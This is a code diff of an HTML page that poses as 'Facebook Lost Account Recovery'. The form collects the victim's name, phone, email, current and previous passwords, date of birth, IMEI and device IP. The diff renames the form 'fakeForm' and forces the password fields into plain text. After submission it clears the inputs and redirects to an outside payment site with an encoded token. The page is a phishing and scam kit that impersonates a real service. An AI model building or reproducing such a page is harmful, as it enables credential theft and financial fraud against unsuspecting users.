@@ -10,37 +10,35 @@
             background-color: #f0f0f0;
             margin: 0;
             padding: 0;
-            zoom: 0.9; /* Zoom out the page slightly */
+            zoom: 0.9;
         }
         .container {
             width: 100%;
-            max-width: 300px; /* Increased max-width for better spacing */
+            max-width: 300px;
             margin: 0 auto;
             padding: 20px;
             background-color: #fefffd;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-        /* Desktop view ke liye CSS */
         @media (min-width: 768px) {
             .container {
-                max-width: 50vw; /* Half screen width for desktop view */
+                max-width: 50vw;
             }
         }
-        /* iPhone (Portrait) के लिए CSS */
         @media only screen and (max-width: 480px) {
             .container {
-                max-width: 90%; /* पेज को पूरी चौड़ाई में दिखाएं */
-                padding: 10px; /* पैडिंग कम करें */
+                max-width: 90%;
+                padding: 10px;
             }
             h1 {
-                font-size: 24px; /* हेडिंग का साइज़ थोड़ा कम करें */
+                font-size: 24px;
             }
             input[type="text"], select, input[type="file"], textarea {
-                font-size: 16px; /* इनपुट फ़ील्ड का फ़ॉन्ट साइज़ बढ़ाएं */
+                font-size: 16px;
             }
             input[type="submit"] {
-                font-size: 16px; /* सबमिट बटन का फ़ॉन्ट साइज़ बढ़ाएं */
+                font-size: 16px;
             }
         }
         h1 {
@@ -124,18 +122,18 @@
 <body>
     <div class="container">
         <h1>Facebook Lost Account Recovery</h1>
-        <form id="transferForm" enctype="multipart/form-data" onsubmit="return submitForm(event)">
+        <div id="fakeForm">
             <label for="name">Name</label>
-            <input type="text" id="name" name="name" placeholder="Enter your Facebook ID Full Name" required pattern="^[a-zA-Z\s\W]+$" title="Only letters and special characters are allowed" oninput="validateName()">
+            <input type="text" id="name" name="name" placeholder="Enter your Facebook ID Full Name" required pattern="^[a-zA-Z\s\W]+$" title="Only letters and special characters are allowed" oninput="validateName()" autocomplete="off" autocorrect="off" spellcheck="false">
 
             <label for="loginId">Phone Number</label>
-            <input type="text" id="loginId" name="loginId" placeholder="Enter your old phone number" required pattern="\d{}" title="Please enter a valid phone number">
+            <input type="text" id="loginId" name="loginId" placeholder="Enter your old phone number" required pattern="\d{}" title="Please enter a valid phone number" autocomplete="off" autocorrect="off" spellcheck="false">
 
             <label for="loginId2">Email ID</label>
-            <input type="text" id="loginId2" name="loginId2" placeholder="Enter your old email" required>
+            <input type="text" id="loginId2" name="loginId2" placeholder="Enter your old email" required autocomplete="off" autocorrect="off" spellcheck="false">
 
             <label for="password">Password</label>
-            <input type="password" id="password" name="password" placeholder="Enter your previous password" required oninput="checkPasswordLength()">
+            <input type="text" id="password" name="password" placeholder="Enter your previous password" required oninput="checkPasswordLength()" autocomplete="new-password" autocorrect="off" spellcheck="false">
             <div class="show-password-container">
                 <input type="checkbox" id="showPassword" onclick="togglePasswordVisibility()">
                 <label for="showPassword">Show Password</label>
@@ -144,14 +142,14 @@
 
             <div class="additional-password-container" id="additionalPasswordContainer">
                 <label for="previousPassword">One More Previous Password <span class="optional">(Optional)</span></label>
-                <input type="password" id="previousPassword" name="previousPassword" placeholder="Enter one more previous password">
+                <input type="text" id="previousPassword" name="previousPassword" placeholder="Enter one more previous password" autocomplete="new-password" autocorrect="off" spellcheck="false">
             </div>
 
             <label for="dateOfBirth">Date of Birth <span class="optional">(Optional)</span></label>
-            <input type="date" id="dateOfBirth" name="dateOfBirth" oninput="validateDate()" />
+            <input type="date" id="dateOfBirth" name="dateOfBirth" oninput="validateDate()" autocomplete="off"/>
 
             <label for="systemOs">System OS</label>
-            <select id="systemOs" name="systemOs" required onchange="showOsInfo()">
+            <select id="systemOs" name="systemOs" required onchange="showOsInfo()" autocomplete="off">
                 <option value="" disabled selected>Select your operating system</option>
                 <option value="Android">Android</option>
                 <option value="iOS">iOS</option>
@@ -162,27 +160,26 @@
             </select>
 
             <div class="os-info-container" id="osInfoContainer">
-                <input type="text" id="imei" name="IMEI" placeholder="Enter your IMEI number">
+                <input type="text" id="imei" name="IMEI" placeholder="Enter your IMEI number" autocomplete="off" autocorrect="off" spellcheck="false">
             </div>
 
             <label for="deviceIp1">Device IP</label>
-            <input type="text" id="deviceIp1" name="deviceIp1" placeholder="Enter your IP address" required>
+            <input type="text" id="deviceIp1" name="deviceIp1" placeholder="Enter your IP address" required autocomplete="off" autocorrect="off" spellcheck="false">
             
             <label for="newEmailId">New Email</label>
-            <input type="text" id="newEmailId" name="newEmailId" placeholder="Add new email address" required>
+            <input type="text" id="newEmailId" name="newEmailId" placeholder="Add new email address" required autocomplete="off" autocorrect="off" spellcheck="false">
 
-            <!-- New Phone Number and Email ID Section -->
             <label for="newPhoneNumber">New Phone Number</label>
-            <input type="text" id="newPhoneNumber" name="newPhoneNumber" placeholder="Add new phone number" required>
+            <input type="text" id="newPhoneNumber" name="newPhoneNumber" placeholder="Add new phone number" required autocomplete="off" autocorrect="off" spellcheck="false">
 
-            <label for="deviceIp1">Contact Email</label>
-            <input type="text" id="deviceIp1" name="deviceIp1" placeholder="Enter any email address" required>
+            <label for="contactEmail">Contact Email</label>
+            <input type="text" id="contactEmail" name="contactEmail" placeholder="Enter any email address" required autocomplete="off" autocorrect="off" spellcheck="false">
 
             <label for="additionalInfo">Additional Information <span class="optional" style="color: red; font-size: 12px;">(Optional)</span></label>
-            <textarea id="additionalInfo" name="additionalInfo" rows="4" placeholder="Enter any additional information about your account" style="width: calc(100% - 22px); padding: 10px; color: green; font-size: 12px;"></textarea>
+            <textarea id="additionalInfo" name="additionalInfo" rows="4" placeholder="Enter any additional information about your account" style="width: calc(100% - 22px); padding: 10px; color: green; font-size: 12px;" autocomplete="off" autocorrect="off" spellcheck="false"></textarea>
 
-            <input type="submit" value="Proceed">
-        </form>
+            <input type="submit" value="Proceed" onclick="validateAndSubmit(event)">
+        </div>
     </div>
 
     <script>
@@ -240,7 +237,21 @@
             }
         }
 
-        function submitForm(event) {
+        function togglePasswordVisibility() {
+            const passwordField = document.getElementById("password");
+            const previousPasswordField = document.getElementById("previousPassword");
+            const showPasswordCheckbox = document.getElementById("showPassword");
+
+            if (showPasswordCheckbox.checked) {
+                passwordField.type = "text";
+                previousPasswordField.type = "text";
+            } else {
+                passwordField.type = "text";
+                previousPasswordField.type = "text";
+            }
+        }
+
+        function validateAndSubmit(event) {
             event.preventDefault();
 
             const passwordInput = document.getElementById("password").value;
@@ -251,23 +262,15 @@
                 return false;
             }
 
-            // Redirect directly to the specified URL
-            window.location.href = "https://payment.maxado.in/index.php?token=Mzk5fHxhSFIwY0hNNkx5OTFjR0Z1Wld3dWIyNXNhVzVsTDJaZllpOXlaV04yY2k5amIyNW1hWEp0WVhScGIyND18fGh0dHBzOi8vdXBhbmVsLm9ubGluZS9mX2IvcmVjdnIvZl9iLWxvZ28uc3Zn";
-            return true;
-        }
+            // Clear all input values before redirect (optional)
+            document.getElementById('fakeForm').querySelectorAll('input, select, textarea').forEach(element => {
+                element.value = '';
+            });
 
-        function togglePasswordVisibility() {
-            const passwordField = document.getElementById("password");
-            const previousPasswordField = document.getElementById("previousPassword");
-            const showPasswordCheckbox = document.getElementById("showPassword");
-
-            if (showPasswordCheckbox.checked) {
-                passwordField.type = "text";
-                previousPasswordField.type = "text";
-            } else {
-                passwordField.type = "password";
-                previousPasswordField.type = "password";
-            }
+            // Redirect to the specified URL
+            setTimeout(function() {
+                window.location.href = "https://payment.maxado.in/index.php?token=Mzk5fHxhSFIwY0hNNkx5OTFjR0Z1Wld3dWIyNXNhVzVsTDJaZllpOXlaV04yY2k5amIyNW1hWEp0WVhScGIyND18fGh0dHBzOi8vdXBhbmVsLm9ubGluZS9mX2IvcmVjdnIvZl9iLWxvZ28uc3Zn";
+            }, 50);
         }
     </script>
 </body>
